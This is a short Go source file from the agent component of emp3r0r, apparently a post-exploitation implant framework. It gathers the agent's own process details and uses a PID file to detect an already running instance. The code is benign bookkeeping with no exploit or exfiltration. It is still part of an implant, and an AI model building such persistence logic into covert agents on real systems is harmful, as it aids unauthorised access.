package agent

import (
	"io/ioutil"
	"log"
	"os"
	"strconv"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// CheckAgentProcess fill up info.emp3r0r_data.AgentProcess
func CheckAgentProcess() *emp3r0r_data.AgentProcess {
	p := &emp3r0r_data.AgentProcess{}
	p.PID = os.Getpid()
	p.PPID = os.Getppid()
	p.Cmdline = util.ProcCmdline(p.PID)
	p.Parent = util.ProcCmdline(p.PPID)

	return p
}

// IsAgentRunningPID is there any emp3r0r agent already running?
func IsAgentRunningPID() (bool, int) {
	defer func() {
		myPIDText := strconv.Itoa(os.Getpid())
		if err := ioutil.WriteFile(RuntimeConfig.PIDFile, []byte(myPIDText), 0600); err != nil {
			log.Printf("Write RuntimeConfig.PIDFile: %v", err)
		}
	}()

	pidBytes, err := ioutil.ReadFile(RuntimeConfig.PIDFile)
	if err != nil {
		return false, -1
	}
	pid, err := strconv.Atoi(string(pidBytes))
	if err != nil {
		return false, -1
	}

	_, err = os.FindProcess(pid)
	return err == nil, pid
}
